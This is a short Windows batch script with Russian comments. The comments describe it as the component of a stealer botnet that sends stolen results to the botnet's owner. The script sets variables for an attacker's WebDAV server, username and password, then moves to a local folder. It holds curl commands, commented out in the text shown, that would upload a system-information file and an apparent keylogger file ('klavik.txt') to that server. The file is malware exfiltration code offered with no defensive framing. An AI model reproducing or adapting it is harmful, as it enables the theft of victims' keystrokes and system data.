@echo on
rem Сценарий Windows, отправляющий результаты работы стайлера хозяину
rem Служит для оффлайн подачи команд хозяина стайлера, когда онлайн доступ не работает.

Rem !!! Обязательная часть ботнета  !!!

rem Define the Variables:
rem Main Folder
set Mainfolder=webdav
rem Protocol Prefix
set pref=%Hacker_httppref%
rem HTTP Port
set port=%Hacker_httpport%

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolderU=%PUB1%\Util
 
 
rem Goto Server Catalog

cd /d %LocalFolderU%
 

REM Необязательная часть ботнета

rem curl --upload-file "MySystemInfoCheck.txt" -v --user %user%:%password% %host%
rem curl --upload-file "klavik.txt" -v --user %user%:%password% %host%
